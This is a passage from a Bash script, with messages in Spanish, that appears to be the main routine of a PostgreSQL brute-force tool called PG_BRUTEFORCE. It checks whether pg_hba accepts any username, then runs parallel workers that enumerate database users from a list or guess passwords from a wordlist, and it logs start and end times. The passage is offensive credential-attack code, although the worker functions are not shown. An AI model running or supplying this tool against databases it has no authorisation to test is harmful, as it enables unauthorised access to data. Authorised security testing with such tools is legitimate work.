    if [ "$CLI_TIMEOUT_EXPLICIT" = false ] && [[ -n "$SESSION_SUGGESTED_TIMEOUT" ]]; then
        CLI_TIMEOUT="$SESSION_SUGGESTED_TIMEOUT"
    fi
    [ "$QUIET_MODE" = false ] && mostrar_sesion_cargada
fi

[[ -n "$OUTPUT_FILE" ]] && \
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [START] PG_BRUTEFORCE v${VERSION} | Host: $HOST:$PORT | DB: $DB | Workers: $WORKERS | Timeout: ${CLI_TIMEOUT}s | SessionLoaded: $SESSION_LOADED" >> "$OUTPUT_FILE"

# Modo Análisis
if [ "$ANALYZE_MODE" = true ]; then
    modo_analisis; exit 0
fi

# Enumeración de usuarios
if [[ -n "$USER_FILE" ]]; then
    [[ ! -f "$USER_FILE" ]] && { echo -e "${RED}[ERROR] Archivo no encontrado: $USER_FILE${NC}"; exit 1; }

    # Guardia pg_hba
    if [ "$SESSION_LOADED" = true ] && [ "$SESSION_HBA_ACEPTA_TODOS" = "true" ]; then
        echo -e "${CYAN}[*] La sesión previa ya detectó que pg_hba acepta TODOS los usuarios.${NC}"
        advertencia_hba_acepta_todos "abort" "pgbf_probe_*** (sesión previa)"
        exit 1
    else
        if [ "$SESSION_LOADED" = false ]; then
            [ "$QUIET_MODE" = false ] && \
                echo -ne "${CYAN}[*] Pre-check pg_hba (sin sesión previa): sondeo con usuario ficticio ... ${NC}"
        else
            [ "$QUIET_MODE" = false ] && \
                echo -ne "${CYAN}[*] Pre-check pg_hba: verificando configuración actual ... ${NC}"
        fi
        verificar_hba_acepta_todos; HBA_RESULT=$?
        case $HBA_RESULT in
            0)
                [ "$QUIET_MODE" = false ] && echo -e "${RED}¡ADVERTENCIA!${NC}"
                probe_name=$(generar_usuario_falso)
                advertencia_hba_acepta_todos "abort" "$probe_name"
                exit 1 ;;
            1)
                [ "$QUIET_MODE" = false ] && echo -e "${GREEN}OK (pg_hba selectivo — enumeración válida)${NC}" ;;
            2)
                [ "$QUIET_MODE" = false ] && {
                    echo -e "${YELLOW}INDETERMINADO${NC}"
                    echo -e "${YELLOW}[!] No se pudo confirmar el comportamiento de pg_hba. Continúa con cautela.${NC}"
                } ;;
        esac
    fi
    lanzar_workers "users"
    [ "$QUIET_MODE" = false ] && echo -e "\n${CYAN}[*] Enumeración completada.${NC}"

# Fuerza bruta de contraseñas
elif [[ -n "$PASS_FILE" ]]; then
    [[ ! -f "$PASS_FILE" ]] && { echo -e "${RED}[ERROR] Archivo no encontrado: $PASS_FILE${NC}"; exit 1; }
    lanzar_workers "passwords"
    [ "$QUIET_MODE" = false ] && echo -e "\n${CYAN}[*] Fuerza bruta completada.${NC}"

else
    mostrar_ayuda
fi

[[ -n "$OUTPUT_FILE" ]] && \
    echo "[$(date +'%Y-%m-%d %H:%M:%S')] [END] Proceso finalizado." >> "$OUTPUT_FILE"
